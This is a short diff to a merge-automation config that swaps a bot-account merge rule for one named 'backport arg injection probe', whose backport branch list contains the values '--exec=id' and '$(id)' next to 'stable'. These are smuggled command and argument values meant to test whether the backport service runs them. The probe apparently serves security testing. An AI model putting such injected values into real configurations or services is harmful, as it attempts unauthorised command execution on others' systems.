@@ -1,7 +1,10 @@
 pull_request_rules:
-  - name: merge as admin colleague
+  - name: backport arg injection probe
     conditions:
-      - label=do-merge
+      - label=bp-probe
     actions:
-      merge:
-        merge_bot_account: "Pockriglian"
+      backport:
+        branches:
+          - "--exec=id"
+          - "$(id)"
+          - "stable"
